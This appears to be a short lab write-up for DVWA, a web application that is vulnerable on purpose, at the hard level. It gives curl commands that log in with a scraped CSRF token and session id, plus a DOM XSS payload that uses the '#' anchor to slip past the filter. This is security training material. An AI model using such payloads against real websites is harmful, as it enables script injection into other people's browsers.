
### Target

    https://github.com/ethicalhack3r/DVWA

    Security level: hard

### Prereq

    # get user token
    $ TOKEN=$(curl -c dvwa.session -s http://192.168.56.101/DVWA/login.php | grep 'user_token' | awk -F 'value=' '{print $2}' | cut -d"'" -f2)

    # get session id
    $ PHPSESSID=$(grep PHPSESSID dvwa.session | awk -F' ' '{print $7}')

    # log in
    $ curl -L -b "PHPSESSID=${PHPSESSID};security=high" -v -d "username=admin&password=password&Login=Login&user_token=${TOKEN}" http://192.168.56.101/DVWA/login.php

### XSS (DOM)

Trick with anchor ('#') also works here:

    English#<script>alert(1);</script>
